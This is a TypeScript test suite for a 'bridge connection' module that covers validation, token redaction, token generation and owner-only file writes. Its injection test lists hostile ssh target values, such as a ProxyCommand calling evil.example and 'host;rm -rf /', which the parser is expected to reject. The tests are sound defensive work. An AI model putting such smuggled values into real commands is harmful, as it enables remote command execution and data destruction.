import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { OracleError } from "../errors.js";
import {
  BRIDGE_CONNECTION_VERSION,
  bridgeConnectionAgeMs,
  bridgeConnectionPath,
  createBridgeConnection,
  generateBridgeToken,
  parseBridgeConnection,
  readBridgeConnection,
  redactBridgeConnection,
  writeBridgeConnection
} from "./connection.js";

function validConnection(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    version: BRIDGE_CONNECTION_VERSION,
    createdAt: "2026-07-31T00:00:00.000Z",
    host: "127.0.0.1",
    port: 9473,
    token: "secret-token",
    ssh: { target: "ada@build-box", port: 22 },
    ...overrides
  };
}

describe("bridge connection artifact", () => {
  test("round-trips a valid artifact", () => {
    const parsed = parseBridgeConnection(validConnection());
    expect(parsed.host).toBe("127.0.0.1");
    expect(parsed.port).toBe(9473);
    expect(parsed.ssh?.target).toBe("ada@build-box");
  });

  test("rejects an ssh target that could smuggle an ssh option", () => {
    for (const target of [
      "-oProxyCommand=curl evil.example",
      "-l root",
      "-bad",
      "ada@-bad",
      "ada@host;rm -rf /"
    ]) {
      expect(() => parseBridgeConnection(validConnection({ ssh: { target } }))).toThrow(
        OracleError
      );
    }
  });

  test("rejects an identity file that starts with a dash", () => {
    expect(() =>
      parseBridgeConnection(
        validConnection({ ssh: { target: "ada@build-box", identityFile: "-oProxyCommand=x" } })
      )
    ).toThrow(/may not start with/);
  });

  test("rejects an unsupported version and unknown fields", () => {
    expect(() => parseBridgeConnection(validConnection({ version: 99 }))).toThrow(
      /unsupported version 99/
    );
    expect(() => parseBridgeConnection(validConnection({ extra: true }))).toThrow(OracleError);
  });

  test("rejects an out-of-range port and an unparseable timestamp", () => {
    expect(() => parseBridgeConnection(validConnection({ port: 70_000 }))).toThrow(OracleError);
    expect(() => parseBridgeConnection(validConnection({ createdAt: "not-a-date" }))).toThrow(
      /not a valid timestamp/
    );
  });

  test("createBridgeConnection stamps the version and validates its input", () => {
    const connection = createBridgeConnection({
      host: "127.0.0.1",
      port: 9473,
      token: "t",
      now: new Date("2026-07-31T00:00:00.000Z")
    });
    expect(connection.version).toBe(BRIDGE_CONNECTION_VERSION);
    expect(connection.createdAt).toBe("2026-07-31T00:00:00.000Z");
    expect(connection.ssh).toBeUndefined();
    expect(() =>
      createBridgeConnection({ host: "127.0.0.1", port: 9473, ssh: { target: "-bad" } })
    ).toThrow(OracleError);
  });

  test("redaction removes the token without mutating the original", () => {
    const connection = parseBridgeConnection(validConnection());
    const redacted = redactBridgeConnection(connection);
    expect(redacted.token).toBe("<redacted>");
    expect(JSON.stringify(redacted)).not.toContain("secret-token");
    expect(connection.token).toBe("secret-token");
  });

  test("generated tokens are long and unique", () => {
    const first = generateBridgeToken();
    const second = generateBridgeToken();
    expect(first).toHaveLength(64);
    expect(first).not.toBe(second);
  });

  test("bridgeConnectionAgeMs measures against createdAt", () => {
    const connection = parseBridgeConnection(validConnection());
    expect(
      bridgeConnectionAgeMs(connection, new Date("2026-07-31T01:00:00.000Z"))
    ).toBe(3_600_000);
  });

  test("bridgeConnectionPath defaults under .oracle and honours an override", () => {
    expect(bridgeConnectionPath("/work")).toBe(path.join("/work", ".oracle", "bridge.json"));
    expect(bridgeConnectionPath("/work", "custom/link.json")).toBe(
      path.join("/work", "custom", "link.json")
    );
  });
});

describe("bridge connection persistence", () => {
  let directory: string;

  beforeEach(async () => {
    directory = await fs.mkdtemp(path.join(os.tmpdir(), "oracle-bridge-"));
  });

  afterEach(async () => {
    await fs.rm(directory, { recursive: true, force: true });
  });

  test("writes owner-only and reads back what it wrote", async () => {
    const filePath = path.join(directory, "nested", "bridge.json");
    const connection = parseBridgeConnection(validConnection());
    await writeBridgeConnection(filePath, connection);

    const stats = await fs.stat(filePath);
    if (process.platform !== "win32") {
      expect(stats.mode & 0o777).toBe(0o600);
    }
    await expect(readBridgeConnection(filePath)).resolves.toEqual(connection);
  });

  test("overwrites an existing artifact and leaves no temp files behind", async () => {
    const filePath = path.join(directory, "bridge.json");
    await writeBridgeConnection(filePath, parseBridgeConnection(validConnection()));
    await writeBridgeConnection(
      filePath,
      parseBridgeConnection(validConnection({ port: 9500 }))
    );

    const entries = await fs.readdir(directory);
    expect(entries).toEqual(["bridge.json"]);
    await expect(readBridgeConnection(filePath)).resolves.toMatchObject({ port: 9500 });
  });

  test("a missing artifact is an actionable error, not a crash", async () => {
    await expect(readBridgeConnection(path.join(directory, "absent.json"))).rejects.toThrow(
      /No bridge connection artifact/
    );
  });

  test("a corrupt artifact reports invalid JSON", async () => {
    const filePath = path.join(directory, "bridge.json");
    await fs.writeFile(filePath, "{not json", "utf8");
    await expect(readBridgeConnection(filePath)).rejects.toThrow(/not valid JSON/);
  });
});
